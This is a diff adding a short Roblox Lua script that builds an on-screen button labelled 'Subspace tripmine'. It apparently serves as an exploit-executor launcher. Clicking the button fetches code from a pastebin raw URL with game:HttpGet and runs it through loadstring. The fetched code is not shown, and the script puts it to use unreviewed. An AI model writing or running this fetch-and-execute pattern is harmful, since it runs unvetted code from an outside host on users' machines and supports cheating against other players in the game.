@@ -1,0 +1,23 @@
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Parent = player.PlayerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+frame.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
+frame.Parent = gui
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 150, 0, 50)
+button.Position = UDim2.new(0.5, -75, 0.5, -25)
+button.Text = "Subspace tripmine"
+button.Parent = frame
+
+local codeToExecute = [[
+    loadstring(game:HttpGet('https://pastebin.com/raw/6R5vUuDK'))()
+]]
+
+button.MouseButton1Click:Connect(function()
+    loadstring(codeToExecute)()
+end)
